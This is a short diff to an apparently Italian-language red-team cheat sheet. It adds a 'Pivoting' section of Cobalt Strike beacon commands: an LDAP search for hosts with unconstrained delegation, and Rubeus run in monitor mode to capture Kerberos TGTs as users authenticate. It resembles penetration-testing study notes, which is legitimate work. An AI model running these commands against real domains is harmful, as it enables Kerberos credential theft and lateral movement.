@@ -1028,3 +1028,23 @@ ipmo ActiveDirectory
 Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Server lon-dc-1
 
 ```
+
+
+## Pivoting
+
+```bash
+#Ricerca Uncostrain Delegation
+beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
+
+
+#Rubeus può “ascoltare” e catturare TGT in tempo reale quando gli utenti si autenticano.
+#Rubeus monitor
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap
+
+#per arrestarlo
+#elenca i job
+jobs
+
+#killa il job selezionato
+jobkill 0
+```
